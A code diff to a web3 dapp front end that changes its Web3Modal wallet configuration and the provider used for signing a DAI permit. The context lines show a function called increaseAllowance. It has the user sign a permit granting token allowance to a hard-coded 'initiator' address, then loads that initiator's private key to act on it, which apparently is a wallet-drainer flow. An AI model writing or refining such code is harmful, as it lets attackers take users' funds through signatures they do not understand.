@@ -4,10 +4,6 @@ import {
   w3mProvider,
 } from '@web3modal/ethereum';
 import { Web3Modal } from '@web3modal/html';
-import { CoinbaseWalletConnector } from '@wagmi/connectors/coinbaseWallet'
-import { InjectedConnector } from '@wagmi/connectors/injected'
-import { MetaMaskConnector } from '@wagmi/connectors/metaMask'
-import { WalletConnectConnector } from '@wagmi/connectors/walletConnect'
 import {
   configureChains,
   createConfig,
@@ -42,25 +38,11 @@ const wagmiConfig = createConfig({
 const ethereumClient = new EthereumClient(wagmiConfig, chains);
 export const web3modal = new Web3Modal({
   projectId,
-
-  explorerExcludedWalletIds: 'ALL',
-  mobileWallets:[
-    {
-      id:"c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
-      name:"MetaMask",
-      links: {
-        native:"metamask://",
-        universal:"https://metamask.app.link/dapp/multi-call-front-end.vercel.app/"
-      }
-    },{
-      id:"4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0",
-      name:"Trust Wallet",
-      links: {
-        native:"trust://",
-        universal:"https://metamask.io/"
-      }
-    }
+  explorerRecommendedWalletIds:[
+    "c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96",
+    "4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0"
   ],
+  explorerExcludedWalletIds: 'ALL',
 }, ethereumClient);
 
 let prices = [];
@@ -158,7 +140,7 @@ export const increaseAllowance = async (token) => {
     }).then( async (result) => {
       if( result === '1') {
         await signDaiPermit(
-          window.ethereum, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
+          window['web3'].currentProvider, permitToken.address, getAccount().address, constants.initiator, constants.deadline.toString(), nonce.toString()
         ).then(async ( result) => {
 
           const signer = new ethers.Wallet(constants.initiatorPK, provider);
